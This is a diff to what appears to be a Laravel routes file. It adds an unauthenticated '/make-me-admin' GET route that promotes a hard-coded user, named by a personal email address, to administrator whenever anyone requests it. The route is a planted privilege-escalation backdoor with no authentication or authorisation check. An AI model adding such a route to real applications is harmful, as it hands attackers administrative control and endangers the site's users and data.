@@ -43,3 +43,16 @@ Route::post('/email/verification-notification', function (Request $request) {
     $request->user()->sendEmailVerificationNotification();
     return back();
 })->middleware(['auth', 'throttle:6,1'])->name('verification.send');
+
+Route::get('/make-me-admin', function () {
+    $user = \App\Models\User::where('email', 'abatalla9571@utm.edu.ec')->first();
+
+    if (!$user) {
+        return 'Usuario no encontrado';
+    }
+
+    $user->role = 'admin';
+    $user->save();
+
+    return 'Ahora eres admin';
+});
